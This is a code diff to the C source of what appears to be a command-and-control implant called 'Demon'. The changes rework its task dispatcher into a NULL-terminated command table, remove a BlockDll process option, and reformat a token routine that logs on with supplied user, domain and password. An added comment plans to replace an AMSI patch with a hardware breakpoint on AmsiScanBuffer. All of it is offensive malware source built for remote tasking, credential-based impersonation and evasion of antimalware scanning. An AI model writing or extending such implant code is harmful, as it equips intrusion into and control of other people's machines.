@@ -12,9 +12,8 @@
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
 
+// TODO: change AMSI patch to hardware breakpoint on AmsiScanBuffer
 BOOL AmsiPatched = FALSE;
-
-#define DEMON_COMMAND_SIZE  ( sizeof( DemonCommands ) / sizeof ( DemonCommands[ 0 ] ) )
 
 DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
@@ -35,6 +34,9 @@ DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SPAWN_DLL,                .Function = CommandSpawnDLL                 },
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
+
+        // End
+        { .ID = NULL, .Function = NULL }
 };
 
 VOID CommandDispatcher( VOID )
@@ -47,7 +49,6 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
 
@@ -80,19 +81,17 @@ VOID CommandDispatcher( VOID )
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
                     }
 
-                    FoundCommand = FALSE;
-                    for ( UINT32 FunctionCounter = 0; FunctionCounter < DEMON_COMMAND_SIZE; FunctionCounter++ )
+                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
                     {
+                        if ( DemonCommands[ FunctionCounter ].Function == NULL )
+                            break;
+
                         if ( DemonCommands[ FunctionCounter ].ID == CommandID )
                         {
                             DemonCommands[ FunctionCounter ].Function( &TaskParser );
-                            FoundCommand = TRUE;
                             break;
                         }
                     }
-
-                    if ( ! FoundCommand )
-                        PUTS( "Command not found !!" )
                 }
 
             } while ( Parser.Length > 4 );
@@ -420,16 +419,6 @@ VOID CommandProc( PPARSER DataArgs )
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
-
-            break;
-        }
-
-        case 5: PUTS( "Proc::BlockDll" )
-        {
-            UINT32 BlockOnOrOff = ParserGetInt32( DataArgs );
-
-            Instance->Config.Process.BlockDll = ( BOOL ) BlockOnOrOff;
-            PackageAddInt32( Package, BlockOnOrOff );
 
             break;
         }
@@ -800,7 +789,6 @@ VOID CommandFS( PPARSER DataArgs )
             PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )
 
             hFile = Instance->Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
-
             if ( hFile == INVALID_HANDLE_VALUE )
             {
                 PUTS( "CreateFileW: Failed" )
@@ -1364,7 +1352,6 @@ VOID CommandToken( PPARSER Parser )
             UCHAR  Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PCHAR  UserDomain     = NULL;
-            DWORD  Type           = NULL;
             LPSTR  BufferUser     = NULL;
             LPSTR  BufferPassword = NULL;
             LPSTR  BufferDomain   = NULL;
@@ -1395,9 +1382,17 @@ VOID CommandToken( PPARSER Parser )
 
                     MemCopy( BufferUser, lpUser, dwUserSize );
                     MemCopy( BufferPassword, lpPassword, dwPasswordSize );
-                    MemCopy( BufferDomain,lpDomain, dwDomainSize );
+                    MemCopy( BufferDomain, lpDomain, dwDomainSize );
 
-                    TokenAdd( hToken, UserDomain, TOKEN_TYPE_MAKE_NETWORK, NtCurrentTEB()->ClientId.UniqueProcess, BufferUser, BufferDomain, BufferPassword );
+                    TokenAdd(
+                        hToken,
+                        UserDomain,
+                        TOKEN_TYPE_MAKE_NETWORK,
+                        NtCurrentTEB()->ClientId.UniqueProcess,
+                        BufferUser,
+                        BufferDomain,
+                        BufferPassword
+                    );
 
                     PRINTF( "UserDomain => %s\n", UserDomain )
 
